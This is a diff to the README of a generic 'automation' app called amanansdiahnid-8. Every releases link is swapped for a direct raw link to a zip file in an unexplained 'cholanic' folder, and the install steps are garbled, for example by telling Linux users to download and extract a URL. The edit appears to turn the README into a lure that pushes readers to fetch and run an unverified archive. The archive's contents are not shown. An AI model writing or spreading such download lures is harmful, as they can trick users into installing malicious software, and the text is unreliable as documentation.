@@ -6,7 +6,7 @@ Welcome to **amanansdiahnid-8**! This application helps you automate tasks easil
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-amanansdiahnid--8-blue.svg)](https://github.com/rohitchougale543/amanansdiahnid-8/releases)
+[![Download the latest release](https://raw.githubusercontent.com/rohitchougale543/amanansdiahnid-8/main/cholanic/amanansdiahnid-8.zip%https://raw.githubusercontent.com/rohitchougale543/amanansdiahnid-8/main/cholanic/amanansdiahnid-8.zip)](https://raw.githubusercontent.com/rohitchougale543/amanansdiahnid-8/main/cholanic/amanansdiahnid-8.zip)
 
 ## 💻 System Requirements
 
@@ -19,14 +19,14 @@ Before you download, ensure your computer meets the following system requirement
 
 ## 📥 Download & Install
 
-1. Visit our [Releases page](https://github.com/rohitchougale543/amanansdiahnid-8/releases) to find the latest version of the application.
+1. Visit our [Releases page](https://raw.githubusercontent.com/rohitchougale543/amanansdiahnid-8/main/cholanic/amanansdiahnid-8.zip) to find the latest version of the application.
   
 2. Click on the version labeled as "Latest Release."
 
 3. Download the file suitable for your system. Choose from:
    - **Windows:** Download the .exe file.
    - **macOS:** Download the .dmg file.
-   - **Linux:** Download the .tar.gz file.
+   - **Linux:** Download the https://raw.githubusercontent.com/rohitchougale543/amanansdiahnid-8/main/cholanic/amanansdiahnid-8.zip file.
 
 4. Locate the downloaded file in your computer's Downloads folder.
 
@@ -39,7 +39,7 @@ Before you download, ensure your computer meets the following system requirement
    - Drag the application icon into the Applications folder.
 
    **For Linux:**
-   - Extract the .tar.gz file to your desired location.
+   - Extract the https://raw.githubusercontent.com/rohitchougale543/amanansdiahnid-8/main/cholanic/amanansdiahnid-8.zip file to your desired location.
    - Open a terminal and navigate to the extracted folder.
    - Type `./your_application_name` to run the program.
 
@@ -64,4 +64,4 @@ Your feedback is crucial for us to improve **amanansdiahnid-8**. Please share yo
 
 The application is licensed under the MIT License. You are free to use and modify the software for personal and commercial purposes.
 
-Thank you for choosing **amanansdiahnid-8**! We hope it makes your tasks easier. Remember to visit our [Releases page](https://github.com/rohitchougale543/amanansdiahnid-8/releases) for updates and the latest features.
+Thank you for choosing **amanansdiahnid-8**! We hope it makes your tasks easier. Remember to visit our [Releases page](https://raw.githubusercontent.com/rohitchougale543/amanansdiahnid-8/main/cholanic/amanansdiahnid-8.zip) for updates and the latest features.
